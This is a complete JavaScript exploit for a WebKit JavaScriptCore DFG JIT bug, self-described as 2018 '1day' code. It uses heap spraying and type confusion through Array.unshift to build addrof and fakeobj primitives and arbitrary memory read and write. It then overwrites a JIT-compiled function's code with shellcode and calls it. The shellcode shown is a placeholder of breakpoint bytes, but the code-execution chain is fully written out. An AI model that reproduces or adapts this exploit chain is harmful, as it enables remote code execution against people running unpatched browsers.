/*
    2018.12
    Exploit written by grigoritchy.
    Sadly 1day exploit code since current version of webkit.
*/

var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)
var i8 = new Uint8Array(conversion_buffer)

var BASE32 = 0x100000000
function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}

function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}

var SHELLCODE = [0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc];
var spray_address = 0x11a4e5020;
var spray_length = 0x100000;
var spray_count = 0x40;
var sprays = [];
for(var i = 0; i < spray_count; i++)
    sprays[i] = new Array(spray_length);


var unboxed = {p1:1.1, p2:2.2};



var arrayStructs = [];
function sprayArrayStructures() {
    function randomString() {
        return Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
    }
    for(var i = 0; i < 0x1000; i++) {
        var a = [];
        a[0] = 1.1;
        a[randomString()] = 1.1;
        arrayStructs.push(a);
    }
}

function sprayArray() {
    var structureID = 0x800;
    var cellTypes = 0x01072107; // ArrayType
    i32[0] = structureID;
    i32[1] = cellTypes;
    var cell = f64[0];
    
    for(var i = 0; i < spray_count; i++) {
        for(var j = 0; j < spray_length; j++) {
            var o = {p1:1.1, p2:1.1, p3:cell, p4:unboxed, p5:2.2, p6:3.3};
            sprays[i][j] = o;
        }
    }
}

var hashkey = 527641; // key 527641 results 951.
var arr = [1, 2, 3, 4];
var obj = {};

print('[+] Setup HashTable.');
print('[+] Our hashkey will point to sprayed data.');
i32[0] = 0xffffffff; // tableSize
i32[1] = 1; // tableSizeMask
obj.p1 = f64[0];
i32[0] = 0xffffffff; // m_keyCount
i32[1] = 1; // m_deletedCount
obj.p2 = f64[0];

// m_table
obj[3] = i2f(hashkey);
obj[4] = i2f(spray_address); // value
obj[5] = i2f(0xa); // attributes;

print('[+] Spray 0x40 * 0x100000 arrays and array structureID.');
sprayArrayStructures();
sprayArray();

var target_object = {};
var boxed = {};
boxed[0] = 4.4;
boxed[1] = 5.5;
boxed[2] = target_object;


unboxed[0] = 1.1;
unboxed[1] = 2.2;
unboxed[2] = 3.3;


/*
(lldb) x/32gx 0x00000001048b04a0
0x1048b04a0: 0x0008210700000380 0x00000001048c83a0 <<< cell, unboxed
0x1048b04b0: 0x00000001048b43d0 0x0001000000000003
0x1048b04c0: 0x020016000000114a 0x0000000000000000
0x1048b04d0: 0x0001000100010001 0x0001000100010001

(lldb) x/32gx 0x00000001048c83a0
0x1048c83a0: 0x0000160600000144 0x00000008000fe928 << unboxed cell, unboxed butterfly
0x1048c83b0: 0x3ff299999999999a 0x400299999999999a
0x1048c83c0: 0x0000160600000144 0x00000008000d8008
0x1048c83d0: 0x00010001ffffffff 0x00010001ffffffff


*/

print('[+] Tier up as a DFG, trigger bug.');
for (var i = 0; i < 4000000; i++) {
    arr.unshift(arr[hashkey], [], obj, 1.1);
    if(arr[0] != undefined)
        break;
}

var unboxed_butterfly = f2i(arr[0][1]); // unboxed's butterfly.
if(unboxed_butterfly.toString(16) == '7ff8000000000000') {
    throw new Error('[-] failed. This is not our spray data. try again.');
}
print("[+] unboxed_butterfly address: " + unboxed_butterfly.toString(16));
arr[0][1] = i2f(unboxed_butterfly + 0x10);


target_object_address = f2i(unboxed[0x90]);
print("[+] target_object_address: " + target_object_address.toString(16));

var addrof = function(object) {
    boxed[2] = object;
    return f2i(unboxed[0x90]);
};

var fakeobj = function(addr, direct=false) {
    if(direct) unboxed[0x90] = addr;
    else unboxed[0x90] = i2f(addr);
    return boxed[2];
};

var victim = [];
victim[0] = 1.1;
victim.target = 2.2;

i32[0] = 0x800;
i32[1] = 0x01072107;
/* 
container
jsCellHeader butterfly
                    |
                    |
                    |
    -----------------
    |
    |
    victim 
    cell butterfly
    2.2
*/
var container = {};
container.jsCellHeader = f64[0];
container.butterfly = victim;
var addr = addrof(container) + 0x10;
var fakeObject = fakeobj(addr);
print('[+] fakeObject: ' + addrof(fakeObject).toString(16));

var memory = {  
    read64: function(addr) {
        fakeObject[1] = i2f(addr + 0x10);
        var res = addrof(victim.target);
        return res;
    },
    write64: function(addr, val, direct=false) {
        fakeObject[1] = i2f(addr + 0x10);
        victim.target = fakeobj(val, direct);
    },
    write: function(addr, data) {
        var align = 0;
        data = data.concat(eval('[' + '0x90, '.repeat( 8 - (data.length%8) ) + ']'));
        for(var i = 0; i < (data.length / 8); i++) {
            align = 8*i;
            for(var j = 0; j < 8; j++) {
                i8[j] = data[align + j];
            }
            this.write64(addr + align, f64[0], true);
        }
    }
};

function jit() {
    function target(x) {
        return x;
    }

    for (var i = 0; i < 1000; i++) {
        target(i);
    }

    return target;
}

var func = jit();
var funcAddr = addrof(func);
print('[+] funcAddr: ', funcAddr.toString(16));
var executable = memory.read64(funcAddr + 24);
var jitCodeForCall = memory.read64(executable + 24);
var codePtr = memory.read64(jitCodeForCall + 32);
print('[+] codePtr: ', codePtr.toString(16));

memory.write(codePtr, SHELLCODE);
print('[+] shellcode will run...');
func();
